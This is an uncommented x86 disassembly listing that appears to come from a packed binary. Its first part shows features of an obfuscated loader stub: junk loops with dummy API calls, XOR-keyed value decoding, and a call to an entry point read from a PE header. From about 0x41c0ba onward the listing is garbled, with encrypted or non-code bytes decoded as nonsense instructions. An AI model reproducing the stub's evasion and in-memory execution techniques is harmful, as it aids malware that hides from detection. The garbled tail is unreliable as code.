  41b8c1:	mov    DWORD PTR ds:0x42901c,edi
  41b8c7:	jmp    0x41b893
  41b8cc:	sub    DWORD PTR ds:0x429008,ecx
  41b8d2:	mov    DWORD PTR [ebp-0xc],eax
  41b8d5:	and    DWORD PTR ds:0x42d01c,0x0
  41b8df:	mov    edi,DWORD PTR ds:0x42d01c
  41b8e5:	inc    edi
  41b8e6:	mov    DWORD PTR ds:0x42d01c,edi
  41b8ec:	cmp    DWORD PTR ds:0x42d01c,0x13
  41b8f3:	jne    0x41b909
  41b8f9:	push   0x8e10
  41b8fe:	push   0x4244a4
  41b903:	call   DWORD PTR ds:0x425010
  41b909:	cmp    DWORD PTR ds:0x42d01c,0x11
  41b910:	jb     0x41b8df
  41b916:	pop    edi
  41b917:	push   0x4240ae
  41b91c:	sub    DWORD PTR ds:0x42a018,0x42b000
  41b926:	call   DWORD PTR ds:0x425024
  41b92c:	adc    DWORD PTR ds:0x42c014,0x59ac
  41b936:	push   esi
  41b937:	xor    DWORD PTR ds:0x42d018,0x57bc
  41b941:	push   0x2
  41b943:	add    DWORD PTR ds:0x42a014,0x11b6
  41b94d:	push   0x1
  41b94f:	push   0x2
  41b951:	and    DWORD PTR ds:0x42d004,0x42a01c
  41b95b:	push   0x1
  41b95d:	and    DWORD PTR ds:0x42a004,0x42b014
  41b967:	push   0x8678768
  41b96c:	sbb    DWORD PTR ds:0x42901c,0x42c014
  41b976:	push   0x87676776
  41b97b:	sub    DWORD PTR ds:0x42a008,0x42c014
  41b985:	call   DWORD PTR ds:0x425000
  41b98b:	push   esi
  41b98c:	push   0x68
  41b98e:	push   0xd
  41b990:	push   0x5
  41b992:	push   0x3
  41b994:	push   0x5468787
  41b999:	sub    DWORD PTR ds:0x429014,0x2577
  41b9a3:	call   DWORD PTR ds:0x425008
  41b9a9:	xor    DWORD PTR ds:0x42c00c,0x43e8
  41b9b3:	dec    edi
  41b9b4:	mov    DWORD PTR ds:0x42d008,0x724a
  41b9be:	jne    0x41b917
  41b9c4:	push   0x4240c2
  41b9c9:	push   esi
  41b9ca:	push   esi
  41b9cb:	call   DWORD PTR ds:0x425038
  41b9d1:	or     DWORD PTR ds:0x42b004,0x42b00c
  41b9db:	test   eax,eax
  41b9dd:	je     0x41ba3c
  41b9e3:	add    DWORD PTR ds:0x429008,edx
  41b9e9:	mov    eax,ds:0x75687681
  41b9ee:	and    DWORD PTR ds:0x429024,0x0
  41b9f8:	mov    ebx,DWORD PTR ds:0x429024
  41b9fe:	inc    ebx
  41b9ff:	mov    DWORD PTR ds:0x429024,ebx
  41ba05:	cmp    DWORD PTR ds:0x429024,0x24
  41ba0c:	jne    0x41ba1e
  41ba12:	push   DWORD PTR [ebp-0x24]
  41ba15:	push   DWORD PTR [ebp-0x18]
  41ba18:	call   DWORD PTR ds:0x425018
  41ba1e:	cmp    DWORD PTR ds:0x429024,0x1e
  41ba25:	jb     0x41b9f8
  41ba2b:	add    DWORD PTR ds:0x42d000,ebx
  41ba31:	imul   eax,eax,0x5463da19
  41ba37:	mov    ds:0x75687681,eax
  41ba3c:	not    eax
  41ba3e:	mov    eax,DWORD PTR [ebp-0xc]
  41ba41:	mov    ebx,DWORD PTR ds:0x42b010
  41ba47:	mov    ebx,0xf89c85b6
  41ba4c:	cmp    eax,ebx
  41ba4e:	mov    DWORD PTR ds:0x42d01c,0x2eca
  41ba58:	jne    0x41baa0
  41ba5e:	add    DWORD PTR ds:0x429018,0x42a018
  41ba68:	mov    DWORD PTR ds:0x4240aa,0xf89c85b5
  41ba72:	or     DWORD PTR ds:0x42b01c,0x42c010
  41ba7c:	push   DWORD PTR [ebp+0x10]
  41ba7f:	push   DWORD PTR [ebp+0xc]
  41ba82:	push   DWORD PTR [ebp+0x8]
  41ba85:	call   0x408413
  41ba8a:	adc    edi,edi
  41ba8c:	mov    ecx,DWORD PTR ds:0x423f9a
  41ba92:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ba98:	sbb    esi,0x7064
  41ba9e:	mov    DWORD PTR [ecx],eax
  41baa0:	mov    DWORD PTR [ebp-0x4],ebx
  41baa3:	add    esi,0x7033
  41baa9:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bab0:	and    DWORD PTR ds:0x42d000,0x0
  41baba:	jmp    0x41bace
  41babf:	xor    ecx,ecx
  41bac1:	add    ecx,DWORD PTR ds:0x42d000
  41bac7:	inc    ecx
  41bac8:	mov    DWORD PTR ds:0x42d000,ecx
  41bace:	cmp    DWORD PTR ds:0x42d000,0x1d
  41bad5:	jae    0x41bb24
  41badb:	cmp    DWORD PTR ds:0x42d000,0x9
  41bae2:	jne    0x41bafb
  41bae8:	push   0x42b01c
  41baed:	push   DWORD PTR [ebp-0x1c]
  41baf0:	push   0x4243b0
  41baf5:	call   DWORD PTR ds:0x42501c
  41bafb:	cmp    DWORD PTR ds:0x42d000,0x8
  41bb02:	jne    0x41bb15
  41bb08:	mov    ecx,DWORD PTR ds:0x42d000
  41bb0e:	inc    ecx
  41bb0f:	mov    DWORD PTR ds:0x42d000,ecx
  41bb15:	jmp    0x41babf
  41bb1a:	mov    DWORD PTR ds:0x42a01c,0x231b
  41bb24:	lea    eax,[ebp-0x28]
  41bb27:	and    DWORD PTR ds:0x42c008,0x0
  41bb31:	mov    edi,DWORD PTR ds:0x42c008
  41bb37:	inc    edi
  41bb38:	mov    DWORD PTR ds:0x42c008,edi
  41bb3e:	cmp    DWORD PTR ds:0x42c008,0x17
  41bb45:	jne    0x41bb59
  41bb4b:	push   0x42a00c
  41bb50:	push   DWORD PTR [ebp-0x18]
  41bb53:	call   DWORD PTR ds:0x425020
  41bb59:	cmp    DWORD PTR ds:0x42c008,0x10
  41bb60:	jb     0x41bb31
  41bb66:	and    DWORD PTR ds:0x42900c,0x0
  41bb70:	jmp    0x41bb84
  41bb75:	xor    ecx,ecx
  41bb77:	or     ecx,DWORD PTR ds:0x42900c
  41bb7d:	inc    ecx
  41bb7e:	mov    DWORD PTR ds:0x42900c,ecx
  41bb84:	cmp    DWORD PTR ds:0x42900c,0x1b
  41bb8b:	jae    0x41bc1f
  41bb91:	cmp    DWORD PTR ds:0x42900c,0x20
  41bb98:	jne    0x41bba7
  41bb9e:	push   DWORD PTR [ebp-0x14]
  41bba1:	call   DWORD PTR ds:0x425028
  41bba7:	jmp    0x41bb75
  41bbac:	mov    DWORD PTR ds:0x42b00c,0x15
  41bbb6:	cmp    DWORD PTR ds:0x42b00c,0x0
  41bbbd:	je     0x41bc1f
  41bbc3:	cmp    DWORD PTR ds:0x42b00c,0x4
  41bbca:	jne    0x41bbf1
  41bbd0:	push   0x6080
  41bbd5:	push   DWORD PTR [ebp-0x20]
  41bbd8:	push   0x42d004
  41bbdd:	push   0x710d
  41bbe2:	push   DWORD PTR [ebp-0x10]
  41bbe5:	push   DWORD PTR [ebp-0x14]
  41bbe8:	push   DWORD PTR [ebp-0x24]
  41bbeb:	call   DWORD PTR ds:0x42502c
  41bbf1:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bbf8:	jne    0x41bc0d
  41bbfe:	xor    edi,edi
  41bc00:	add    edi,DWORD PTR ds:0x42b00c
  41bc06:	dec    edi
  41bc07:	mov    DWORD PTR ds:0x42b00c,edi
  41bc0d:	mov    edi,DWORD PTR ds:0x42b00c
  41bc13:	dec    edi
  41bc14:	mov    DWORD PTR ds:0x42b00c,edi
  41bc1a:	jmp    0x41bbb6
  41bc1f:	mov    DWORD PTR [ebp-0x20],eax
  41bc22:	movzx  ecx,BYTE PTR ds:0x429028
  41bc29:	xor    ecx,DWORD PTR ds:0x42c00c
  41bc2f:	mov    DWORD PTR ds:0x429028,ecx
  41bc35:	lea    eax,[ebp-0x2c]
  41bc38:	and    DWORD PTR ds:0x429004,0x0
  41bc42:	jmp    0x41bc54
  41bc47:	mov    esi,DWORD PTR ds:0x429004
  41bc4d:	inc    esi
  41bc4e:	mov    DWORD PTR ds:0x429004,esi
  41bc54:	cmp    DWORD PTR ds:0x429004,0x1e
  41bc5b:	jae    0x41bcfb
  41bc61:	cmp    DWORD PTR ds:0x429004,0x7
  41bc68:	jne    0x41bc79
  41bc6e:	push   0x5e54
  41bc73:	call   DWORD PTR ds:0x425030
  41bc79:	cmp    DWORD PTR ds:0x429004,0x6
  41bc80:	jne    0x41bc95
  41bc86:	xor    esi,esi
  41bc88:	xor    esi,DWORD PTR ds:0x429004
  41bc8e:	inc    esi
  41bc8f:	mov    DWORD PTR ds:0x429004,esi
  41bc95:	jmp    0x41bc47
  41bc9a:	and    DWORD PTR ds:0x42b00c,0x0
  41bca4:	jmp    0x41bcb6
  41bca9:	mov    esi,DWORD PTR ds:0x42b00c
  41bcaf:	inc    esi
  41bcb0:	mov    DWORD PTR ds:0x42b00c,esi
  41bcb6:	cmp    DWORD PTR ds:0x42b00c,0x12
  41bcbd:	jae    0x41bcfb
  41bcc3:	cmp    DWORD PTR ds:0x42b00c,0xc
  41bcca:	jne    0x41bcdc
  41bcd0:	push   DWORD PTR [ebp-0x10]
  41bcd3:	push   DWORD PTR [ebp-0x28]
  41bcd6:	call   DWORD PTR ds:0x425034
  41bcdc:	cmp    DWORD PTR ds:0x42b00c,0xb
  41bce3:	jne    0x41bcf6
  41bce9:	mov    esi,DWORD PTR ds:0x42b00c
  41bcef:	inc    esi
  41bcf0:	mov    DWORD PTR ds:0x42b00c,esi
  41bcf6:	jmp    0x41bca9
  41bcfb:	mov    DWORD PTR [ebp-0x1c],eax
  41bcfe:	mov    eax,ds:0x423f9a
  41bd03:	mov    eax,DWORD PTR [eax+0x1c8]
  41bd09:	mov    eax,DWORD PTR [eax]
  41bd0b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bd0e:	mov    esi,0x7510893
  41bd13:	xor    eax,esi
  41bd15:	mov    edi,0x3272db
  41bd1a:	add    eax,edi
  41bd1c:	mov    DWORD PTR [ecx],eax
  41bd1e:	mov    eax,ds:0x4241aa
  41bd23:	cmp    eax,0x301ac8f5
  41bd28:	jne    0x41bd4f
  41bd2e:	mov    eax,DWORD PTR [ebp-0x4]
  41bd31:	mov    ecx,DWORD PTR ds:0x423f9a
  41bd37:	mov    ecx,DWORD PTR [ecx+0x198]
  41bd3d:	xor    eax,esi
  41bd3f:	add    eax,edi
  41bd41:	mov    DWORD PTR [ecx],eax
  41bd43:	mov    eax,DWORD PTR [ebp-0x4]
  41bd46:	xor    eax,esi
  41bd48:	add    eax,edi
  41bd4a:	mov    ds:0x4241aa,eax
  41bd4f:	mov    eax,ds:0x423f9a
  41bd54:	mov    eax,DWORD PTR [eax+0x18c]
  41bd5a:	mov    eax,DWORD PTR [eax]
  41bd5c:	mov    DWORD PTR [ebp-0x30],eax
  41bd5f:	mov    eax,0xf89c85ba
  41bd64:	mov    DWORD PTR [ebp-0x1c],eax
  41bd67:	mov    DWORD PTR [ebp-0x1c],eax
  41bd6a:	mov    DWORD PTR [ebp-0x1c],eax
  41bd6d:	mov    DWORD PTR [ebp-0x1c],ebx
  41bd70:	mov    DWORD PTR [ebp-0x38],eax
  41bd73:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bd7a:	mov    ebx,DWORD PTR [ebp-0x4]
  41bd7d:	mov    ecx,DWORD PTR [ebp-0x8]
  41bd80:	mov    edx,DWORD PTR [ebp-0x8]
  41bd83:	xor    edx,esi
  41bd85:	xor    ecx,esi
  41bd87:	add    ecx,edx
  41bd89:	mov    edx,DWORD PTR [ebp-0x8]
  41bd8c:	xor    ebx,esi
  41bd8e:	xor    edx,esi
  41bd90:	add    ebx,edi
  41bd92:	lea    ecx,[ecx+edx*1+0x975891]
  41bd99:	cmp    ebx,ecx
  41bd9b:	ja     0x41bdfc
  41bda1:	mov    eax,DWORD PTR [ebp-0x8]
  41bda4:	xor    eax,esi
  41bda6:	lea    eax,[eax+ebx*1+0x3272db]
  41bdad:	push   eax
  41bdae:	mov    eax,DWORD PTR [ebp-0x1c]
  41bdb1:	xor    eax,esi
  41bdb3:	lea    eax,[ebp+eax*1+0x3272e3]
  41bdba:	push   eax
  41bdbb:	mov    eax,ds:0x423f9a
  41bdc0:	push   DWORD PTR [eax+0x1bc]
  41bdc6:	call   0x40843e
  41bdcb:	mov    eax,DWORD PTR [ebp-0x8]
  41bdce:	xor    eax,esi
  41bdd0:	lea    ebx,[ebx+eax*1+0x3272db]
  41bdd7:	mov    eax,DWORD PTR [ebp-0x8]
  41bdda:	mov    ecx,DWORD PTR [ebp-0x8]
  41bddd:	xor    ecx,esi
  41bddf:	xor    eax,esi
  41bde1:	add    eax,ecx
  41bde3:	mov    ecx,DWORD PTR [ebp-0x8]
  41bde6:	xor    ecx,esi
  41bde8:	lea    eax,[eax+ecx*1+0x975891]
  41bdef:	cmp    ebx,eax
  41bdf1:	jbe    0x41bda1
  41bdf7:	mov    eax,0xf89c85ba
  41bdfc:	mov    ecx,DWORD PTR [ebp+0xc]
  41bdff:	mov    DWORD PTR ds:0x423e1e,ecx
  41be05:	mov    ecx,DWORD PTR [ebp+0x10]
  41be08:	mov    DWORD PTR ds:0x424072,ecx
  41be0e:	mov    ecx,DWORD PTR ds:0x423e1e
  41be14:	mov    edx,DWORD PTR [ebp-0x20]
  41be17:	sub    ecx,edi
  41be19:	xor    ecx,esi
  41be1b:	mov    DWORD PTR [edx],ecx
  41be1d:	mov    edx,DWORD PTR [ebp-0xc]
  41be20:	mov    ecx,0xf89c85b6
  41be25:	cmp    edx,ecx
  41be27:	jne    0x41be52
  41be2d:	lea    eax,[ebp-0x14]
  41be30:	mov    DWORD PTR [ebp-0x24],eax
  41be33:	lea    eax,[ebp+0x4]
  41be36:	mov    DWORD PTR [ebp-0x14],eax
  41be39:	mov    eax,DWORD PTR [ebp-0x14]
  41be3c:	test   eax,eax
  41be3e:	je     0x41bf67
  41be44:	mov    eax,DWORD PTR [ebp-0x10]
  41be47:	mov    eax,DWORD PTR [ebp-0x8]
  41be4a:	lea    eax,[ebp-0x24]
  41be4d:	jmp    0x41bf5e
  41be52:	mov    edx,DWORD PTR [ebp-0x28]
  41be55:	cmp    edx,0xf89c85b5
  41be5b:	je     0x41beb8
  41be61:	mov    edx,DWORD PTR [ebp-0x4]
  41be64:	mov    ebx,DWORD PTR [ebp-0x2c]
  41be67:	xor    edx,esi
  41be69:	add    edx,edi
  41be6b:	cmp    edx,ebx
  41be6d:	je     0x41beb8
  41be73:	mov    eax,ds:0x423f9a
  41be78:	mov    eax,DWORD PTR [eax+0x194]
  41be7e:	mov    ecx,DWORD PTR [eax]
  41be80:	mov    eax,DWORD PTR [ecx+0x3c]
  41be83:	push   DWORD PTR ds:0x424072
  41be89:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41be8d:	push   DWORD PTR ds:0x423e1e
  41be93:	add    eax,ecx
  41be95:	mov    ecx,DWORD PTR ds:0x423f9a
  41be9b:	mov    ecx,DWORD PTR [ecx+0x194]
  41bea1:	push   DWORD PTR [ecx]
  41bea3:	call   eax
  41bea5:	mov    ecx,DWORD PTR ds:0x423f9a
  41beab:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41beb1:	mov    DWORD PTR [ecx],eax
  41beb3:	jmp    0x41bf67
  41beb8:	mov    edx,DWORD PTR [ebp-0x4]
  41bebb:	mov    ebx,DWORD PTR [ebp-0x30]
  41bebe:	xor    edx,esi
  41bec0:	add    edx,edi
  41bec2:	cmp    edx,ebx
  41bec4:	jne    0x41bf1d
  41beca:	mov    edx,DWORD PTR [ebp-0x4]
  41becd:	mov    ebx,DWORD PTR ds:0x423f9a
  41bed3:	mov    ebx,DWORD PTR [ebx+0x198]
  41bed9:	xor    edx,esi
  41bedb:	add    edx,edi
  41bedd:	cmp    edx,DWORD PTR [ebx]
  41bedf:	jne    0x41befa
  41bee5:	push   ecx
  41bee6:	mov    ecx,DWORD PTR [ebp-0x4]
  41bee9:	xor    ecx,esi
  41beeb:	add    ecx,edi
  41beed:	push   ecx
  41beee:	push   eax
  41beef:	push   DWORD PTR [ebp-0x8]
  41bef2:	push   DWORD PTR [ebp-0x4]
  41bef5:	call   0x416ab7
  41befa:	push   DWORD PTR [ebp-0x8]
  41befd:	push   DWORD PTR [ebp-0x4]
  41bf00:	call   0x41bf89
  41bf05:	mov    eax,DWORD PTR [ebp-0x4]
  41bf08:	xor    eax,esi
  41bf0a:	add    eax,edi
  41bf0c:	mov    ds:0x42401e,eax
  41bf11:	mov    eax,DWORD PTR [ebp-0x4]
  41bf14:	xor    eax,esi
  41bf16:	add    eax,edi
  41bf18:	mov    ds:0x424016,eax
  41bf1d:	lea    eax,[ebp-0x18]
  41bf20:	mov    DWORD PTR [ebp-0x34],eax
  41bf23:	lea    eax,[ebp+0x4]
  41bf26:	mov    DWORD PTR [ebp-0x18],eax
  41bf29:	mov    eax,DWORD PTR [ebp-0x18]
  41bf2c:	test   eax,eax
  41bf2e:	je     0x41bf67
  41bf34:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  41bf3b:	mov    DWORD PTR [ebp-0x40],0x712ed08
  41bf42:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  41bf49:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  41bf50:	call   0x411f4d
  41bf55:	mov    eax,DWORD PTR [ebp-0x10]
  41bf58:	mov    eax,DWORD PTR [ebp-0x8]
  41bf5b:	lea    eax,[ebp-0x34]
  41bf5e:	push   eax
  41bf5f:	push   DWORD PTR [ebp-0x4]
  41bf62:	call   0x40f9a6
  41bf67:	mov    eax,ds:0x423f9a
  41bf6c:	push   0x4
  41bf6e:	add    eax,0x1cc
  41bf73:	push   eax
  41bf74:	lea    eax,[ebp-0x10]
  41bf77:	push   eax
  41bf78:	call   0x40843e
  41bf7d:	mov    eax,DWORD PTR [ebp-0x10]
  41bf80:	mov    eax,DWORD PTR [eax]
  41bf82:	pop    edi
  41bf83:	pop    esi
  41bf84:	pop    ebx
  41bf85:	leave  
  41bf86:	ret    0xc
  41bf89:	push   ebp
  41bf8a:	mov    ebp,esp
  41bf8c:	sub    esp,0x98
  41bf92:	mov    eax,DWORD PTR [ebp+0x8]
  41bf95:	inc    ecx
  41bf96:	push   ebx
  41bf97:	sbb    DWORD PTR ds:0x42a014,edx
  41bf9d:	push   esi
  41bf9e:	add    esi,esi
  41bfa0:	push   edi
  41bfa1:	and    DWORD PTR ds:0x42c014,0x0
  41bfab:	jmp    0x41bfbd
  41bfb0:	mov    edi,DWORD PTR ds:0x42c014
  41bfb6:	inc    edi
  41bfb7:	mov    DWORD PTR ds:0x42c014,edi
  41bfbd:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bfc4:	jae    0x41c01b
  41bfca:	cmp    DWORD PTR ds:0x42c014,0xb
  41bfd1:	jne    0x41bfea
  41bfd7:	push   0x4244f4
  41bfdc:	push   0x424486
  41bfe1:	push   DWORD PTR [ebp-0x1c]
  41bfe4:	call   DWORD PTR ds:0x42503c
  41bfea:	cmp    DWORD PTR ds:0x42c014,0xa
  41bff1:	jne    0x41c004
  41bff7:	mov    edi,DWORD PTR ds:0x42c014
  41bffd:	inc    edi
  41bffe:	mov    DWORD PTR ds:0x42c014,edi
  41c004:	jmp    0x41bfb0
  41c009:	mov    esi,DWORD PTR ds:0x42c000
  41c00f:	or     esi,DWORD PTR ds:0x42a000
  41c015:	mov    DWORD PTR ds:0x42c000,esi
  41c01b:	mov    esi,0x7510893
  41c020:	xor    eax,esi
  41c022:	mov    edi,DWORD PTR ds:0x423dca
  41c028:	mov    ecx,DWORD PTR ds:0x423de6
  41c02e:	sub    edi,ecx
  41c030:	sub    edi,DWORD PTR [edi+ecx*1]
  41c033:	mov    edi,0x3272db
  41c038:	add    eax,edi
  41c03a:	xor    ecx,0x38ef
  41c040:	mov    DWORD PTR [ebp-0x30],eax
  41c043:	mov    eax,ds:0x423e1a
  41c048:	mov    DWORD PTR ds:0x429010,0x1f
  41c052:	cmp    DWORD PTR ds:0x429010,0x0
  41c059:	je     0x41c0ad
  41c05f:	cmp    DWORD PTR ds:0x429010,0xf
  41c066:	jne    0x41c081
  41c06c:	push   0x82e0
  41c071:	push   0x7826
  41c076:	push   0x30a6
  41c07b:	call   DWORD PTR ds:0x425040
  41c081:	cmp    DWORD PTR ds:0x429010,0x10
  41c088:	jne    0x41c09b
  41c08e:	mov    ecx,DWORD PTR ds:0x429010
  41c094:	dec    ecx
  41c095:	mov    DWORD PTR ds:0x429010,ecx
  41c09b:	mov    ecx,DWORD PTR ds:0x429010
  41c0a1:	dec    ecx
  41c0a2:	mov    DWORD PTR ds:0x429010,ecx
  41c0a8:	jmp    0x41c052
  41c0ad:	mov    eax,DWORD PTR [eax]
  41c0af:	add    ecx,DWORD PTR ds:0x42a01c
  41c0b5:	jmp    0x41e403
  41c0ba:	icebp  
  41c0bb:	push   ecx
  41c0bc:	inc    edi
  41c0bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0bf:	mov    ds:0x413825ab,eax
  41c0c4:	aaa    
  41c0c5:	and    al,0xea
  41c0c7:	adc    DWORD PTR [eax+0x61fd2498],0x62
  41c0ce:	push   ecx
  41c0cf:	pop    edi
  41c0d0:	bound  esp,QWORD PTR [edx+0x40]
  41c0d3:	mov    ds:0x80b24e13,eax
  41c0d8:	pop    ds
  41c0d9:	adc    dl,BYTE PTR [ebp-0x36c0d027]
  41c0df:	fs ins BYTE PTR es:[edi],dx
  41c0e1:	pop    esi
  41c0e2:	inc    esp
  41c0e3:	push   eax
  41c0e4:	stos   DWORD PTR es:[edi],eax
  41c0e5:	lods   al,BYTE PTR ds:[si]
  41c0e7:	es pop esi
  41c0e9:	sbb    bh,BYTE PTR [esi]
  41c0eb:	bound  edi,QWORD PTR [edi]
  41c0ed:	loop   0x41c0e4
  41c0ef:	icebp  
  41c0f0:	pop    eax
  41c0f1:	aad    0x2a
  41c0f3:	push   ecx
  41c0f4:	cmp    bl,BYTE PTR [edx]
  41c0f6:	aas    
  41c0f7:	test   eax,0x4fe9158f
  41c0fc:	sub    al,0xc4
  41c0fe:	fstp   DWORD PTR [esi+edi*1+0x4d88a24]
  41c106:	(bad)
  41c109:	cwde   
  41c10a:	stc    
  41c10b:	or     al,ah
  41c10d:	or     al,0xfa
  41c10f:	test   eax,0xd4284b91
  41c114:	jmp    0xa133df3e
  41c119:	lahf   
  41c11a:	mov    ecx,0xbae273b8
  41c11f:	xlat   BYTE PTR ds:[ebx]
  41c120:	push   edx
  41c121:	pop    edx
  41c122:	push   ebx
  41c123:	push   ebp
  41c124:	jge    0x41c16e
  41c126:	xchg   esp,eax
  41c127:	arpl   WORD PTR [ebx-0x723ad545],bp
  41c12d:	mov    eax,ds:0xcdfdc9c7
  41c132:	inc    ebx
  41c133:	retf   
  41c134:	and    BYTE PTR [esi],bl
  41c136:	arpl   WORD PTR [esi-0x26],bp
  41c139:	aas    
  41c13a:	push   DWORD PTR [eax-0x4a]
  41c13d:	retf   
  41c13e:	mov    dl,0x4d
  41c140:	xchg   esi,eax
  41c141:	in     eax,0x19
  41c143:	in     eax,0x5c
  41c145:	sub    eax,0xa8fa397f
  41c14a:	xor    BYTE PTR [eax],dh
  41c14c:	push   esp
  41c14d:	adc    dh,BYTE PTR [edi-0x35d9c2f7]
  41c153:	pop    esp
  41c154:	push   ds
  41c155:	call   DWORD PTR [edi]
  41c157:	mov    BYTE PTR [ebx+0x1e],dh
  41c15a:	shl    DWORD PTR [ebp+0x58],cl
  41c15d:	push   esi
  41c15e:	ror    BYTE PTR [ecx+0x9],cl
  41c161:	retf   
  41c162:	cmp    ah,BYTE PTR [ebp+0x3df00920]
  41c168:	fst    st(5)
  41c16a:	mov    ch,BYTE PTR [eax+0x3f24b004]
  41c170:	jmp    0xfd546122
  41c175:	mov    ds:0x202da606,eax
  41c17a:	cmp    DWORD PTR [edi+0x3adc36b7],edi
  41c180:	sbb    ebx,DWORD PTR fs:[ebx+0x1e]
  41c184:	popa   
  41c185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c186:	cdq    
  41c187:	lea    edi,[ecx+0x46]
  41c18a:	dec    eax
  41c18b:	out    dx,eax
  41c18c:	imul   esi,DWORD PTR [edi-0x4d9a645a],0x4787e514
  41c196:	fiadd  DWORD PTR [ecx]
  41c198:	out    0xca,eax
  41c19a:	pop    edx
  41c19b:	ds scas eax,DWORD PTR es:[edi]
  41c19d:	sbb    BYTE PTR ds:0x572b2d50,ch
  41c1a3:	ja     0x41c132
  41c1a5:	xchg   edi,eax
  41c1a6:	jo     0x41c130
  41c1a8:	xchg   esi,eax
  41c1a9:	push   ebp
  41c1aa:	adc    dl,BYTE PTR [ecx+ebp*4+0x263b57fa]
  41c1b1:	or     edi,ecx
  41c1b3:	nop
  41c1b4:	fstp   QWORD PTR [edi+0x1e]
  41c1b7:	cs in  al,0x7
  41c1ba:	fwait
  41c1bb:	xchg   ecx,eax
  41c1bc:	sbb    al,0x40
  41c1be:	popa   
  41c1bf:	(bad)  
  41c1c0:	test   ch,0x3d
  41c1c3:	sbb    BYTE PTR [esi-0x18],bh
  41c1c6:	xor    BYTE PTR [ecx+0xe171896],bl
  41c1cc:	xrstors [edx]
  41c1cf:	inc    eax
  41c1d0:	js     0x41c169
  41c1d2:	xchg   BYTE PTR [esp+esi*4+0x9916b0b],cl
  41c1d9:	ds (bad) 
  41c1db:	in     al,0x75
  41c1dd:	pop    esi
  41c1de:	mov    al,ds:0x8fc90116
  41c1e3:	mov    ecx,0x4f90ea89
  41c1e8:	push   eax
  41c1e9:	jb     0x41c1fb
  41c1eb:	out    0x58,eax
  41c1ed:	xlat   BYTE PTR ds:[ebx]
  41c1ee:	aaa    
  41c1ef:	call   0xd09abff8
  41c1f4:	or     ebp,DWORD PTR [eax-0x79]
  41c1f7:	jmp    esp
  41c1f9:	jg     0x41c1c1
  41c1fb:	gs jb  0x41c1e7
  41c1fe:	mov    esi,DWORD PTR ds:0x68c0fb59
  41c204:	adc    al,0xe8
  41c206:	adc    edx,edx
  41c208:	mov    ebp,0x4c0ee820
  41c20d:	xchg   ebp,eax
  41c20e:	test   eax,0x2b5e4097
  41c213:	cmp    esi,DWORD PTR [esi+0x67]
  41c216:	inc    ebp
  41c217:	int3   
  41c218:	or     edx,DWORD PTR [eax-0x5f]
  41c21b:	fcmovu st,st(2)
  41c21d:	(bad)  
  41c21e:	rcr    DWORD PTR [edx+0x4a],cl
  41c221:	test   eax,edi
  41c223:	mov    al,ds:0xb3ff179a
  41c228:	jmp    0x41c260
  41c22a:	stos   DWORD PTR es:[edi],eax
  41c22b:	cmp    ah,BYTE PTR [ebx-0x30]
  41c22e:	out    dx,al
  41c22f:	mov    edi,0xcba39317
  41c234:	fcomp  st(5)
  41c236:	sub    DWORD PTR [edi],esp
  41c238:	and    ebx,DWORD PTR [edi+edi*4]
  41c23b:	xor    al,0x82
  41c23d:	inc    ebp
  41c23e:	mov    ecx,0x381c65d4
  41c243:	dec    ebp
  41c244:	dec    ebp
  41c245:	add    bh,al
  41c247:	dec    ebx
  41c248:	cli    
  41c249:	or     BYTE PTR [esi],cl
  41c24b:	in     al,0xf5
  41c24d:	dec    ecx
  41c24e:	stos   BYTE PTR es:[edi],al
  41c24f:	neg    ebp
  41c251:	xor    edx,DWORD PTR [eax]
  41c253:	arpl   WORD PTR [edi],sp
  41c255:	push   ds
  41c256:	cmp    al,0x2b
  41c258:	test   BYTE PTR [ecx+ebp*8+0x67],bh
  41c25c:	(bad)  
  41c25d:	mov    cl,0x8e
  41c25f:	test   esi,ebp
  41c261:	cmp    DWORD PTR [ecx+0xbdd23e9],0x66
  41c268:	cmp    al,0x38
  41c26a:	ins    DWORD PTR es:[edi],dx
  41c26b:	(bad)  
  41c26c:	sub    eax,0xf7ffc1c7
  41c271:	arpl   WORD PTR [esi+0x1e],bx
  41c274:	sub    eax,0x829f912b
  41c279:	fcom   QWORD PTR [ebp+0x13]
  41c27c:	(bad)  
  41c27d:	mov    cl,0x70
  41c27f:	pop    edx
  41c280:	sahf   
  41c281:	pop    esi
  41c282:	(bad)  
  41c283:	stc    
  41c284:	hlt    
  41c285:	sbb    ah,bh
  41c287:	mov    ?,WORD PTR [eax+0x6e]
  41c28a:	and    ah,BYTE PTR [ebx]
  41c28c:	pop    es
  41c28d:	loop   0x41c2d3
  41c28f:	das    
  41c290:	test   BYTE PTR [esi+0x27],dh
  41c293:	xchg   ebp,eax
  41c294:	mov    al,0xa5
  41c296:	push   es
  41c297:	xchg   dl,al
  41c299:	dec    esi
  41c29a:	xchg   esp,esi
  41c29c:	push   es
  41c29d:	add    BYTE PTR [edi+0xee5b00d],dh
  41c2a3:	push   edx
  41c2a4:	ror    BYTE PTR [ecx+0x39],1
  41c2a7:	cmp    eax,0xae1d813
  41c2ac:	add    cl,al
  41c2ae:	push   ecx
  41c2af:	mov    WORD PTR [ecx],cs
  41c2b1:	fmul   QWORD PTR [bp+0x59]
  41c2b5:	add    cl,dh
  41c2b7:	xchg   DWORD PTR [edi-0x10],esp
  41c2ba:	in     eax,dx
  41c2bb:	inc    ebp
  41c2bc:	cmp    ch,BYTE PTR [ebp+esi*8-0x2e]
  41c2c0:	popf   
  41c2c1:	in     eax,dx
  41c2c2:	ror    ch,0x6b
  41c2c5:	lods   al,BYTE PTR ds:[esi]
  41c2c6:	in     al,dx
  41c2c7:	mov    ds:0x363a6918,al
  41c2cc:	dec    esp
  41c2cd:	push   0xbf312422
  41c2d2:	jge    0x41c28f
  41c2d4:	xchg   edi,eax
  41c2d5:	scas   al,BYTE PTR es:[edi]
  41c2d6:	aad    0x7
  41c2d8:	scas   al,BYTE PTR es:[edi]
  41c2d9:	xchg   esi,eax
